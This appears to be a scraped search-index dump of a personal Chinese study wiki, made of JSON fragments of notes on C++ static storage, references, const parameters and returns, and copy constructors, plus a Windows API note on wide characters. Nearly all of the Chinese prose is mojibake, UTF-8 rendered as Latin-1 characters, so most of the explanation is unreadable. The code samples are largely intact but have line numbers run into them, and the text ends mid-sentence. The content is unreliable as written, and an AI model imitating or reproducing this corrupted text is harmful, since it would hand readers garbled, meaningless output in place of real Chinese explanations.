å…¨å±€æ•°æ®åŒº å…¨å±€æ•°æ®åŒº ç”Ÿå‘½å‘¨æœŸ ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ç¨‹åºç»“æŸæ—¶é”€æ¯ ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ç¨‹åºç»“æŸæ—¶é”€æ¯ å¯è§æ€§ æ‰€æœ‰æ–‡ä»¶ å½“å‰æ–‡ä»¶ static å˜é‡åˆå§‹åŒ–ï¼š å¦‚æœæ²¡æœ‰æ˜¾å¼åˆå§‹åŒ–ï¼ŒåŸºæœ¬ç±»å‹ä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸ºé›¶ éstaticï¼ŒåŸºæœ¬ç±»å‹ï¼š å­˜å‚¨ä½ç½®å’Œç”Ÿå‘½å‘¨æœŸï¼šå…¨å±€æ•°æ®åŒºï¼›ç¨‹åºå¯åŠ¨æ—¶åœ¨å¯åŠ¨å‡½æ•°ä¸­åˆå§‹åŒ–ï¼ˆmainå‡½æ•°å‰ï¼‰ï¼Œç¨‹åºç»“æŸæ—¶é”€æ¯ å¯è§æ€§ï¼šæ‰€æœ‰æ–‡ä»¶ staticï¼ŒåŸºæœ¬ç±»å‹ï¼š å­˜å‚¨ä½ç½®å’Œç”Ÿå‘½å‘¨æœŸï¼šå…¨å±€æ•°æ®åŒºï¼›ç¨‹åºå¯åŠ¨æ—¶åœ¨å¯åŠ¨å‡½æ•°ä¸­åˆå§‹åŒ–ï¼ˆmainå‡½æ•°å‰ï¼‰ï¼Œç¨‹åºç»“æŸæ—¶é”€æ¯ å¯è§æ€§ï¼šå½“å‰æ–‡ä»¶ å¦‚æœæ²¡æœ‰æ˜¾å¼åˆå§‹åŒ–ï¼ŒåŸºæœ¬ç±»å‹ä¼šè‡ªåŠ¨åˆå§‹åŒ–ä¸ºé›¶ å±€éƒ¨å˜é‡ï¼ˆåœ¨å‡½æ•°ä¸­çš„å˜é‡ï¼‰ éstatic static å­˜å‚¨ä½ç½® æ ˆ å…¨å±€æ•°æ®åŒº ç”Ÿå‘½å‘¨æœŸ å‡½æ•°è°ƒç”¨æ—¶åˆå§‹åŒ–å‡½æ•°ç»“æŸæ—¶é‡Šæ”¾ ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ç¨‹åºç»“æŸæ—¶é”€æ¯ å¯è§æ€§ å‡½æ•°å†…éƒ¨ï¼Œå—ä½œç”¨åŸŸï¼ˆå·¦å³èŠ±æ‹¬å·&#123;&#125;ï¼‰ å‡½æ•°å†…éƒ¨ï¼Œå—ä½œç”¨åŸŸï¼ˆå·¦å³èŠ±æ‹¬å·&#123;&#125;ï¼‰ éstaticï¼ŒåŸºæœ¬ç±»å‹å’Œå¯¹è±¡ï¼š å­˜å‚¨ä½ç½®å’Œç”Ÿå‘½å‘¨æœŸï¼šå †æ ˆï¼›å‡½æ•°è°ƒç”¨æ—¶åœ¨ç›¸åº”æ ˆå¸§ä¸­åˆå§‹åŒ–ï¼Œå‡½æ•°è°ƒç”¨ç»“æŸæ—¶é‡Šæ”¾ å¯è§æ€§ï¼šå½“å‰ä½œç”¨åŸŸï¼ˆå‡½æ•°å·¦å³èŠ±æ‹¬å·&#123;&#125;é‡Œï¼‰ï¼Œå…¶ä»–å‡½æ•°æ— æ³•è®¿é—®è¯¥å˜é‡ã€‚ å¯¹è±¡ï¼šéœ€è¦éµå®ˆaccess rules staticï¼ŒåŸºæœ¬ç±»å‹å’Œå¯¹è±¡ï¼š å­˜å‚¨ä½ç½®å’Œç”Ÿå‘½å‘¨æœŸï¼šå…¨å±€æ•°æ®åŒºï¼Œå‡½æ•°ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶åˆå§‹åŒ–ï¼Œç¨‹åºç»“æŸæ—¶é”€æ¯ å¯è§æ€§ï¼šè¿˜æ˜¯å½“å‰ä½œç”¨åŸŸï¼ˆå‡½æ•°å·¦å³èŠ±æ‹¬å·&#123;&#125;é‡Œï¼‰ï¼Œå…¶ä»–å‡½æ•°æ— æ³•è®¿é—®è¯¥å˜é‡ å¯¹è±¡ï¼šéœ€è¦éµå®ˆaccess rules å‡½æ•° éstatic static å­˜å‚¨ä½ç½® å‡½æ•°åœ°å€åœ¨å…¨å±€æ•°æ®åŒº å‡½æ•°åœ°å€åœ¨å…¨å±€æ•°æ®åŒº å¯è§æ€§ æ‰€æœ‰æ–‡ä»¶ å½“å‰æ–‡ä»¶ éstaticï¼š å­˜å‚¨ä½ç½®ï¼šå…¨å±€æ•°æ®åŒºï¼Œå‡½æ•°åœ°å€æœ¬èº«æ˜¯å…¨å±€çš„ å¯è§æ€§ï¼šæ‰€æœ‰æ–‡ä»¶ï¼›æˆ–è¢«é™åˆ¶åœ¨namaspaceä¸­ staticï¼š å­˜å‚¨ä½ç½®ï¼šå…¨å±€æ•°æ®åŒºï¼Œå‡½æ•°åœ°å€æœ¬èº«æ˜¯å…¨å±€çš„ å¯è§æ€§ï¼šå½“å‰æ–‡ä»¶ ç±» æˆå‘˜å˜é‡ éstatic static å­˜å‚¨ä½ç½® çœ‹æ˜¯å±€éƒ¨å¯¹è±¡è¿˜æ˜¯å…¨å±€å¯¹è±¡ å…¨å±€æ•°æ®åŒº ç”Ÿå‘½å‘¨æœŸ çœ‹æ˜¯å±€éƒ¨å¯¹è±¡è¿˜æ˜¯å…¨å±€å¯¹è±¡ ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ç¨‹åºç»“æŸæ—¶é”€æ¯ å¯è§æ€§ å—publicã€protectedã€privateé™åˆ¶ è¢«è¯¥ç±»æ‰€æœ‰å¯¹è±¡å…±æœ‰ï¼Œå—publicã€protectedã€privateé™åˆ¶ éstaticï¼š å­˜å‚¨ä½ç½®ï¼Œçœ‹å¯¹è±¡åœ¨å“ªé‡Œå®ä¾‹åŒ– å±€éƒ¨å˜é‡ å…¨å±€å˜é‡ å¯è§æ€§ï¼šå—publicã€protectedã€privateé™åˆ¶ staticï¼š å­˜å‚¨ä½ç½®å’Œç”Ÿå‘½å‘¨æœŸï¼šå…¨å±€æ•°æ®åŒºï¼›ç¨‹åºå¯åŠ¨æ—¶åœ¨å¯åŠ¨å‡½æ•°ä¸­åˆå§‹åŒ–ï¼ˆmainå‡½æ•°å‰ï¼‰ï¼Œç¨‹åºç»“æŸæ—¶é”€æ¯ å¯è§æ€§ï¼šè¢«è¯¥ç±»æ‰€æœ‰å¯¹è±¡å…±æœ‰ï¼Œå—publicã€protectedã€privateé™åˆ¶ ç‰¹æ€§ï¼š è¢«æ‰€æœ‰å¯¹è±¡æ‰€å…±æœ‰ ç±»ä¸­çš„æ˜¯declarationï¼Œå¿…é¡»è¦æœ‰definitionã€‚definitionä¸ç”¨åœ¨å†™static ä¹Ÿæ˜¯ç±»çš„æˆå‘˜ï¼Œæ‰€ä»¥å¯¹è±¡å¯ä»¥é€šè¿‡thisæŒ‡é’ˆè®¿é—®åˆ°ï¼›æˆå‘˜å‡½æ•°ï¼ˆåŒ…æ‹¬é™æ€å’Œéé™æ€ï¼‰ä¹Ÿå¯ä»¥è®¿é—®åˆ° è®¿é—®æ–¹å¼å¯ä»¥æ˜¯ç±»::é™æ€æˆå‘˜å˜é‡æˆ–å¯¹è±¡.é™æ€æˆå‘˜å˜é‡ æˆå‘˜å‡½æ•° éstatic static å­˜å‚¨ä½ç½® å‡½æ•°åœ°å€åœ¨å…¨å±€æ•°æ®åŒº å‡½æ•°åœ°å€åœ¨å…¨å±€æ•°æ®åŒº å¯è§æ€§ å—publicã€protectedã€privateé™åˆ¶ è¢«è¯¥ç±»æ‰€æœ‰å¯¹è±¡å…±æœ‰ï¼Œå—publicã€protectedã€privateé™åˆ¶ éstaticï¼š å­˜å‚¨ä½ç½®ï¼šå…¨å±€æ•°æ®åŒºï¼Œå‡½æ•°åœ°å€æœ¬èº«æ˜¯å…¨å±€çš„ï¼Œä¸å ç”¨ç±»å’Œå¯¹è±¡çš„ç©ºé—´å¤§å° å¯è§æ€§ï¼šå—publicã€protectedã€privateé™åˆ¶ staticï¼š å­˜å‚¨ä½ç½®å’Œç”Ÿå‘½å‘¨æœŸï¼šå…¨å±€æ•°æ®åŒºï¼Œå‡½æ•°åœ°å€æœ¬èº«æ˜¯å…¨å±€çš„ï¼Œä¸å ç”¨ç±»å’Œå¯¹è±¡çš„ç©ºé—´å¤§å° å¯è§æ€§ï¼šè¢«è¯¥ç±»æ‰€æœ‰å¯¹è±¡å…±æœ‰ï¼Œå—publicã€protectedã€privateé™åˆ¶ ç‰¹æ€§ï¼š åªèƒ½è®¿é—®é™æ€æˆå‘˜å˜é‡å’Œè°ƒç”¨é™æ€æˆå‘˜å‡½æ•°ï¼ˆå› ä¸ºä¸å¯¹è±¡å®ä¾‹æ— å…³ï¼Œæ²¡æœ‰thisæŒ‡é’ˆï¼‰ è¢«æ‰€æœ‰å¯¹è±¡æ‰€å…±æœ‰ è°ƒç”¨æ–¹å¼å¯ä»¥æ˜¯ç±»::é™æ€æˆå‘˜å‡½æ•°(å‚æ•°åˆ—è¡¨)æˆ–å¯¹è±¡.é™æ€æˆå‘˜å‡½æ•°(å‚æ•°åˆ—è¡¨)"},{"title":"å¼•ç”¨II","path":"/wiki/Thinking_in_C++/å¼•ç”¨II.html","content":"References as class members Declared without initial value å£°æ˜è¿™ä¸ª&amp;æ—¶æ²¡æ³•ç»™åˆå§‹å€¼ï¼Œå› ä¸ºä¸æ¸…æ¥šå°†æ¥Xçš„å¯¹è±¡å®ä¾‹åŒ–æ—¶è¿™ä¸ªå¼•ç”¨è¦å’Œè°æ†åœ¨ä¸€èµ·ã€‚ Must be initialized using constructor initializer list å¦‚æœæ”¾åœ¨{}é‡Œå†™é‚£æ˜¯assignmentèµ‹å€¼äº†m_y=...; 12345678class X&#123;public: int &amp;m_y; X(int &amp;a);&#125;;X::X(int &amp;a) : m_y(a) &#123;&#125; Returning references Functions can return references But they better refer to non-local variables!ä¸èƒ½è¿”å›å‡½æ•°é‡Œæœ¬åœ°å˜é‡çš„å€¼ï¼Œå‡½æ•°è°ƒç”¨å®Œåä½ è¿˜ç•™ç€é‚£ä¸ªåƒåœ¾å€¼çš„åœ°å€å¹²ä»€ä¹ˆ 123456789#include &lt;assert.h&gt;const int SIZE = 32;double myarray[SIZE];double&amp; subscript(const int i) //å‡½æ•°è¿”å›ç±»å‹æ˜¯è¿”å›doubleç±»å‹å¼•ç”¨&#123; return myarray[i]; //è¿”å›çš„å˜é‡çš„lifetimeéœ€è¦æ¯”subscriptå‡½æ•°é•¿&#125; returné‚£é‡Œè¿”å›çš„æ˜¯ä¸€ä¸ªç›´æ¥çš„å˜é‡ï¼Œæ²¡æœ‰*å·ï¼Œæ²¡æœ‰å…¶ä»–ç¬¦å·ã€‚å› ä¸ºreturnå‡ºå»çš„è¿™ä¸ªå˜é‡å°†æ¥ä¼šåœ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„åœ°æ–¹ä¼šå’Œå¦ä¸€ä¸ªå¼•ç”¨ç»“åˆåœ¨ä¸€èµ·ï¼Œå¦‚ 1double &amp;f = subscript(2); //å³ double&amp; f=myarray[2] Example 1234567891011main()&#123; for (int i = 0; i &lt; SIZE; i++) &#123; myarray[i] = i * 0.5; &#125; double value = subscript(12); //subscriptè¿”å›äº†ä¸€ä¸ªåŒ¿åçš„å¼•ç”¨ï¼Œç„¶åæŠŠè¿™ä¸ªå¼•ç”¨çš„å€¼ç»™äº†valueå˜é‡ // å…¶å®å°±æ˜¯myarray[12]çš„å€¼èµ‹ç»™äº†value subscript(3) = 34.5; // åšå·¦å€¼ï¼Œå…¶å®å°±æ˜¯myarray[3]=34.5&#125; const in Functions Arguments Pass by const value â€“ donâ€™t do it Passing by const reference 1Person(const string&amp; name, int weight); const qualifier protects from changeï¼Œè¡¨ç¤ºå‡½æ•°é‡Œdonâ€™t change the string object å¯¹è°ƒç”¨è€…çš„ä¸€ç§ä¿è¯ï¼Œè¡¨ç¤ºå‡½æ•°å†…éƒ¨ä¸ä¼šä¿®æ”¹è°ƒç”¨è€…é€è¿›æ¥çš„å‚æ•°ï¼Œç”±ç¼–è¯‘å™¨æ£€æŸ¥ more efficient to pass by reference(address)than to pass by value å› ä¸ºby-valueæ–¹å¼ä¼ é€’æœ‰å¤§é‡çš„å †æ ˆèµ‹å€¼å¼€é”€ï¼Œè€Œå¼•ç”¨å’ŒæŒ‡é’ˆåªè¦ä¼ ä¸€ä¸ªåœ°å€ Const reference parameters å¦‚æœä½ ä¸æƒ³è®©å‚æ•°è¢«å‡½æ•°å†…éƒ¨æ”¹å˜ï¼Œå°±åŠ ä¸Šconst 123456// y is a constant! Can&#x27;t be modified.void func(const int&amp; y, int&amp; z)&#123; z = z * 5; // ok y += 8; // error!&#125; Temporary values are const å‡½æ•°å‚æ•°æ˜¯&amp;æ—¶ï¼Œä¸èƒ½ä¼ ä¸€ä¸ªä¸´æ—¶ç»“æœè¿›æ¥ 12void func(int &amp;);func(i * 3); // Generates warning or error ! æœ‰å¾ˆå¤šç§è§£é‡Šæ¥è§£é‡Šä¸ºä»€ä¹ˆä¸è¡Œï¼Œå…¶ä¸­ä¸€ç§æ˜¯ï¼šå½“ç¼–è¯‘å™¨ç¼–è¯‘ä¸Šé¢ä»£ç æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªconstçš„ä¸´æ—¶å˜é‡æ¥æ”¶i*3çš„ç»“æœï¼Œä¸´æ—¶å˜é‡æ˜¯constçš„ï¼Œæ‰€ä»¥ä¸èƒ½ä¼ ç»™(int&amp;)ï¼Œä¸èƒ½access it 123void func(int &amp;);const int tmp@ = i * 3;func(tmp@); // Problem -- binding const ref to non-const argument ! ç»™å‡½æ•°å‚æ•°åŠ ä¸Šconstï¼Œå°±æ²¡é—®é¢˜äº†ï¼Œç¼–è¯‘èƒ½è¿‡ã€‚ å¯ä»¥è¿™æ ·ç†è§£ï¼Œi*3ç¼–è¯‘åä¸´æ—¶ç»“æœçš„å€¼äº¤ç»™äº†ä¸€ä¸ªconstçš„ä¸´æ—¶å˜é‡æ¥å­˜å‚¨ï¼Œconst ä¸´æ—¶å˜é‡å¯ä»¥äº¤ç»™const int&amp; 123456789101112131415#include &lt;iostream&gt;using namespace std;void f(const int&amp; i) //è¡¨ç¤ºå‡½æ•°é‡Œä¸ä¼šä¿®æ”¹ä¼ è¿›æ¥çš„å€¼&#123; cout &lt;&lt; i &lt;&lt; endl;&#125;int main()&#123; int i = 3; f(i * 3); return 0;&#125; const in Function returns return by const value for user defined types, it means â€œprevent use as an valueâ€ for built-inâ€™s it means nothing è¡¨æ˜è¿”å›çš„ä¸œè¥¿ä¸èƒ½è¢«ä¿®æ”¹ 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int x = 0;int&amp; h() // è¿”å›äº†ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œå¯ä»¥è¢«ä¿®æ”¹ï¼Œå¯ä»¥åšå·¦å€¼&#123; return x;&#125;const int&amp; g() // è¿”å›çš„æ˜¯ä¸€ä¸ªå¸¸é‡å¼•ç”¨è¿”å›çš„å€¼ä¸èƒ½å†è¢«ä¿®æ”¹&#123; return x;&#125;int main()&#123; h() = 2; // è¿”å›çš„å¼•ç”¨æ²¡æœ‰åå­—ï¼ŒåŒ¿åäº†ï¼Œh()åœ¨è¿™é‡Œè¡¨ç¤ºæ˜¯xçš„åˆ«åï¼Œè¿™ä¸€è¡Œå®é™…ä¸Šå°±æ˜¯ x = 2 printf(&quot;%d &quot;, x); //g() = 4; // errorï¼šè¡¨è¾¾å¼å¿…é¡»æ˜¯å¯ä¿®æ”¹çš„å·¦å€¼ return 0;&#125; return by const pointer or reference depends on what you want your client to do with the return value è¿™é‡Œåº”è¯¥æ¬åˆ°constä¸€ç«  è§†é¢‘ä¸­ç¼–è¯‘èƒ½è¿‡ï¼Œä¿ºç”¨VCã€g++è¿‡ä¸äº†ã€‚æŠ¥é”™ï¼šè¡¨è¾¾å¼å¿…é¡»æ˜¯å¯ä¿®æ”¹çš„å·¦å€¼ï¼ˆä¼°è®¡ç¼–è¯‘å™¨ç‰ˆæœ¬é«˜äº†å°±ç¼–è¯‘ä¸è¿‡ï¼‰ è§†é¢‘ä¸­æƒ³è¡¨è¾¾çš„æ„æ€æ˜¯ï¼šf()è¿”å‡ºæ¥çš„ä¸´æ—¶å˜é‡å› ä¸ºæ²¡åŠ constï¼Œå¯ä»¥åšå·¦å€¼ï¼Œç„¶åé‚£ä¸ªåŒ¿åå¯¹è±¡.iè¢«èµ‹æˆäº†10ã€‚ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰ä»»ä½•å½¢å¼å¯ä»¥è®¿é—®åˆ°è¿™ä¸ªå¯¹è±¡ã€‚æœ¬æ¥æƒ³ç€ç¼–è¯‘èƒ½è¿‡çš„è¯ï¼ŒåŠ ä¸Šææ„å‡½æ•°ï¼Œçœ‹æ±‡ç¼–èƒ½æ‰¾åˆ°çš„ï¼Œä½†æ˜¯ç¼–è¯‘ä¸è¿‡é‚£å°±ç®—äº† 12345678910111213141516171819202122232425262728class A&#123;public: int i; A() : i(0) &#123;&#125;&#125;;A f()&#123; A a; return a;&#125;// f()æ²¡çœ‹æ‡‚å‚è€ƒg()å°±æ˜ç™½äº†// int g()// &#123;// int i=10;// return i;// &#125;int main()&#123; A a2; a2.i = 10; f().i = 10; return 0;&#125; ç„¶ååœ¨ä¹¦ä¸Šçœ‹åˆ°è¿™æ®µä»£ç ï¼Œç¼–è¯‘æ˜¯é€šè¿‡çš„ 123456789101112131415161718192021222324252627282930313233class X &#123; int i;public: X(int ii = 0); void modify();&#125;;X::X(int ii) &#123; i = ii; &#125;void X::modify() &#123; i++; &#125;X f5() &#123; return X();&#125;const X f6() &#123; return X();&#125;void f7(X&amp; x) &#123; // Pass by non-const reference x.modify();&#125;int main() &#123; f5() = X(1); // OK -- non-const return value f5().modify(); // OK//! f7(f5()); // Causes warning or error// Causes compile-time errors://! f7(f5());//! f6() = X(1);//! f6().modify();//! f7(f6());&#125; ///:~"},{"title":"å¼•ç”¨I-åŸºç¡€æ¦‚å¿µ","path":"/wiki/Thinking_in_C++/å¼•ç”¨I-åŸºç¡€æ¦‚å¿µ.html","content":"A reference is like a constant pointer that is automatically dereferenced by the compiler, so it has the effect of being an alias to an object. Declaring references Initialization establishes a binding æœ¬åœ°æˆ–å…¨å±€å˜é‡ 1type &amp;refname =name; 12int x = 3;int&amp; y = x; A reference must be initialized when it is created. å‚æ•°åˆ—è¡¨æˆ–æˆå‘˜å˜é‡ 1type &amp;refname 12void f(int &amp;x);f(y); åœ¨å‡½æ•°è¢«è°ƒç”¨æˆ–æ„é€ å‡½æ•°æ‰§è¡Œæ—¶åˆå§‹åŒ– Rules of references ç»‘å®šåä¸èƒ½åœ¨æ”¹å˜ï¼Œä¸èƒ½å†æŒ‡å‘åˆ«äºº Assignment changes the object referred-toï¼Œæ”¹å˜å¼•ç”¨çš„å€¼å°±æ˜¯æ”¹å˜å®ƒæŒ‡å‘çš„é‚£ä¸ªå˜é‡çš„å€¼ 12int&amp; y = x;y = 12; // Changes value of x å¼•ç”¨ç»‘å®šçš„ç›®æ ‡å¿…é¡»æœ‰ä½ç½®ï¼Œä¸èƒ½æ˜¯ä¸€ä¸ªä¸´æ—¶çš„ç»“æœ 12void func(int &amp;);func(i * 3); // Warning or error! References in functions You can think of a reference as nothing more than a syntax convenience, if you want. 1234567891011121314151617181920212223242526//: C11:Reference.cpp// Simple C++ referencesint* f(int* x) &#123; (*x)++; return x; // Safe, x is outside this scope&#125;int&amp; g(int&amp; x) &#123; x++; // Same effect as in f() return x; // Safe, outside this scope&#125;int&amp; h() &#123; int q;//! return q; // Error static int x; return x; // Safe, x lives outside this scope&#125;int main() &#123; int a = 0; f(&amp;a); // Ugly (but explicit) g(a); // Clean (but hidden) h()=16;//è¿”å›çš„æ˜¯referenceï¼Œå¯ä»¥åšå·¦å€¼ &#125; ///:~ ä½¿ç”¨å¼•ç”¨ï¼Œä¼šæ›´æ¸…æ™°ï¼Œä½†g(a)çš„å½¢å¼çœ‹ä¸å‡ºæ˜¯by-valueè¿˜æ˜¯by-referencesï¼Œè¡¨æ˜ä¸Šçœ‹æ˜¯ä¼ ä¸€ä¸ªå˜é‡åaï¼Œä½†å®é™…ä¸Šå‡½æ•°å†…éƒ¨å¯èƒ½ä¼šä¿®æ”¹åˆ°ä¼ çš„è¿™ä¸ªå˜é‡aå€¼ ä¸Šé¢h()åšå·¦å€¼çš„é—®é¢˜å·¦å€¼æ˜¯å¯ä»¥è¢«èµ‹å€¼çš„å€¼ã€‚ä¸ä¹‹ç›¸å¯¹çš„æ˜¯å³å€¼ï¼ˆR-valueï¼‰ï¼Œé€šå¸¸æŒ‡é‚£äº›ä¸èƒ½è¢«èµ‹å€¼çš„ä¸´æ—¶å€¼æˆ–å­—é¢å€¼1234567891011121314151617181920212223#include &lt;stdio.h&gt;int x = 0;int&amp; h() // è¿”å›äº†ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼Œå¯ä»¥åšå·¦å€¼&#123; return x;&#125;int* g() // è¿”å›ç±»å‹æ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹ï¼Œè¿”å›äº†&amp;xï¼Œxçš„åœ°å€ï¼Œå¯¹å®ƒè§£å¼•ç”¨åå¯åšå·¦å€¼&#123; return &amp;x;&#125;int main()&#123; h() = 2; // è¿”å›çš„å¼•ç”¨æ²¡æœ‰åå­—ï¼ŒåŒ¿åäº†ï¼Œh()åœ¨è¿™é‡Œè¡¨ç¤ºæ˜¯xçš„åˆ«åï¼Œè¿™ä¸€è¡Œå®é™…ä¸Šå°±æ˜¯ x = 2 printf(&quot;%d &quot;, x); *g() = 4; // å®é™…ä¸Šå°±æ˜¯ *(&amp;x)ï¼Œå³x = 4 printf(&quot;%d &quot;, x); return 0;&#125;è¿è¡Œè¾“å‡º1224int&amp; h()ï¼šè¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªå¯¹æ•´æ•° x çš„å¼•ç”¨ã€‚ç”±äºè¿”å›çš„æ˜¯å¼•ç”¨ï¼Œæ‰€ä»¥åœ¨ main å‡½æ•°ä¸­ h() å¯ä»¥è¢«å½“ä½œ x æ¥ä½¿ç”¨ï¼Œå®ƒæ˜¯ x çš„ä¸€ä¸ªåˆ«åã€‚å› æ­¤ h() = 2; ç­‰åŒäº x = 2;ã€‚int* g()ï¼šè¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘æ•´æ•° x çš„æŒ‡é’ˆã€‚å½“åœ¨ main å‡½æ•°ä¸­ä½¿ç”¨ *g() æ—¶ï¼Œä½ å®é™…ä¸Šæ˜¯åœ¨è§£å¼•ç”¨è¿”å›çš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è·å–æŒ‡é’ˆæ‰€æŒ‡å‘çš„å€¼ï¼Œå³ xã€‚æ‰€ä»¥ *g() = 4; ç›¸å½“äº *(&amp;x) = 4;ï¼Œè¿›ä¸€æ­¥å°±æ˜¯ x = 4;ã€‚å¯¹äºh()ï¼Œå¦‚æœä¸æƒ³è¢«åšå·¦å€¼ï¼ŒåŠ ä¸Šconstï¼Œè¡¨ç¤ºè¿”å›çš„æ˜¯å¸¸é‡å¼•ç”¨ï¼ˆæŒ‡å‘çš„æ˜¯å¸¸é‡ï¼‰ï¼Œä½ ä¸èƒ½é€šè¿‡è¿™ä¸ªå¼•ç”¨æ¥ä¿®æ”¹è¿™ä¸ªå¼•ç”¨æŒ‡å‘çš„å€¼ï¼›g()æŒ‡é’ˆï¼ŒåŒç†123456789const int&amp; h() // è¿”å›çš„æ˜¯ä¸€ä¸ªå¸¸é‡å¼•ç”¨ï¼ˆæŒ‡å‘çš„æ˜¯å¸¸é‡ï¼‰ï¼Œä½ ä¸èƒ½ç”¨è¿™ä¸ªå¼•ç”¨æ¥ä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼&#123; return x;&#125;const int* g() // è¿”å›ä¸€ä¸ªæŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼Œä½ ä¸èƒ½è§£å¼•ç”¨åæ¥ä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼&#123; return &amp;x;&#125; Pointers vs. References References Pointers canâ€™t be null can be set to null are dependent on an existing variable,they are an aliasåˆ«å for an variable pointer is independent of existing objects canâ€™t change to a new â€œaddressâ€ location can change to point to a different address Restrictions No references to references No pointers to references 12int&amp; *p; // illegal //æŒ‡å‘int&amp;çš„æŒ‡é’ˆ æ‰€ä»¥ä¹Ÿæ²¡æœ‰arrays of references Reference to pointer is ok 12void f(int*&amp; p); // pæ˜¯å¼•ç”¨ï¼Œæ˜¯intæŒ‡é’ˆç±»å‹pçš„åˆ«å // å› ä¸ºæŒ‡é’ˆå˜é‡pæœ‰ä½ç½®ï¼Œæ‰€ä»¥å¼•ç”¨å¯ä»¥æ˜¯å®ƒçš„åˆ«å ä»¥ä¸Šä¸¤ç‚¹æ˜¯å› ä¸ºå¼•ç”¨åœ¨åæ±‡ç¼–ä¸­çœ‹æ˜¯æ²¡æœ‰ä½ç½®çš„ï¼Œæ‰¾ä¸åˆ°åœ¨å“ªé‡Œæ¥è¡¨ç¤ºäº†è¿™ä¸ªå¼•ç”¨ï¼Œæ­£å¦‚å¼€å¤´æ‰€è¯´ï¼Œå¼•ç”¨æ˜¯ç¼–è¯‘å™¨æ™ºèƒ½ç»´æŠ¤çš„ä¸€ä¸ªconst pointer Understanding of references è¡¨é¢ä¸Šçœ‹ï¼Œæ˜¯ç»™å˜é‡èµ·åˆ«åï¼Œå¯¹åˆ«åçš„æ“ä½œå°±æ˜¯å¯¹å®ƒæŒ‡å‘çš„é‚£ä¸ªobjectçš„æ“ä½œ å®é™…ä¸Šï¼Œå¼•ç”¨æ˜¯é€šè¿‡constant pointerå®ç°çš„ï¼Œç”±ç¼–è¯‘å™¨ç»´æŠ¤ Why Reference å®‰å…¨ å¼±åŒ–ç‰ˆçš„æŒ‡é’ˆï¼Œä¸èƒ½åšè¿ç®—ï¼Œä¸èƒ½å–å€¼ï¼Œä¸èƒ½æŒ‡å‘åˆ«çš„åœ°æ–¹ã€‚ è¯­ä¹‰æ¸…æ™° è®©ä»£ç å°‘äº†å¾ˆå¤š*å·"},{"title":"æ‹·è´æ„é€ I","path":"/wiki/Thinking_in_C++/æ‹·è´æ„é€ I.html","content":"123 1å·é“¾æ¥ï¼šThinking in C++, 2nd ed. Volume 1 æ‘˜æŠ„ï¼š 11: References &amp; the Copy-Constructor A reference (&amp;) is like a constant pointer that is automatically dereferenced. References are like constant pointers that are automatically dereferenced by the compiler. When a reference is used as a function argument, any modification to the reference inside the function will cause changes to the argument outside the function. a reference has much cleaner syntax."},{"title":"Cè¯­è¨€ä¸­çš„å®½å­—ç¬¦","path":"/wiki/Windows_API/Cè¯­è¨€ä¸­çš„å®½å­—ç¬¦.html","content":"ANSIå­—ç¬¦é›†ä¸Unicodeå­—ç¬¦é›† IDEç¼–ç¨‹ç¯å¢ƒçš„å­—ç¬¦é»˜è®¤ä½¿ç”¨çš„æ˜¯ANSIå­—ç¬¦é›†ï¼ˆå¤šå­—èŠ‚å­—ç¬¦é›†ï¼‰ï¼Œè‹±æ–‡å­—ç¬¦å 1ä¸ªå­—èŠ‚ï¼Œä¸­æ–‡æ±‰å­—å ä¸¤ä¸ªå­—èŠ‚ï¼Œç®€ä½“ä¸­æ–‡Windowsä¸‹çš„ANSIç¼–ç é€šå¸¸æ˜¯æŒ‡GBK(ä»£ç é¡µ936)ã€‚ ä½¿ç”¨Låˆ™è¡¨ç¤ºä½¿ç”¨çš„æ˜¯Unicodeå­—ç¬¦ï¼ŒWindowsç³»ç»Ÿä¸‹çš„Unicodeé»˜è®¤æ˜¯UTF-16å­˜å‚¨è§„åˆ™ã€‚ ä¾‹ szSträ½¿ç”¨çš„æ˜¯ANSIå­—ç¬¦é›†ï¼Œå­—ç¬¦â€™Aâ€™å 1ä¸ªå­—èŠ‚ï¼Œ'ä¸­â€™å 2ä¸ªå­—èŠ‚ï¼Œç»“æŸç¬¦å 1ä¸ªå­—èŠ‚ï¼Œæ€»é•¿åº¦4ä¸ªå­—èŠ‚ã€‚ swzSträ½¿ç”¨çš„æ˜¯Unicode(utf-16)ï¼Œå­—ç¬¦â€™Aâ€™å 2ä¸ªå­—èŠ‚ï¼Œ'ä¸­â€™å 2ä¸ªå­—èŠ‚ï¼Œç»“æŸç¬¦å 2ä¸ªå­—èŠ‚ï¼Œæ€»é•¿åº¦6ä¸ªå­—èŠ‚ã€‚ ANSIå­—ç¬¦é›†ï¼šåœ¨Cè¯­è¨€ä¸­ï¼ŒANSIå­—ç¬¦é›†é€šå¸¸æ˜¯æŒ‡æŒ‰ç…§å½“å‰ç³»ç»Ÿçš„åŒºåŸŸè®¾ç½®ç¼–ç çš„å¤šå­—èŠ‚å­—ç¬¦é›†ã€‚å®ƒé€šå¸¸ç”¨äºè¡¨ç¤ºASCIIå­—ç¬¦ä»¥åŠæ‰©å±•çš„ã€ç‰¹å®šäºè¯­è¨€æˆ–åŒºåŸŸçš„å­—ç¬¦ DBCS(åŒå­—èŠ‚å­—ç¬¦é›†)ã€å‡†ç¡®è¯´,åº”è¯¥æ˜¯MBCS(Multi-Byte Chactacter System, 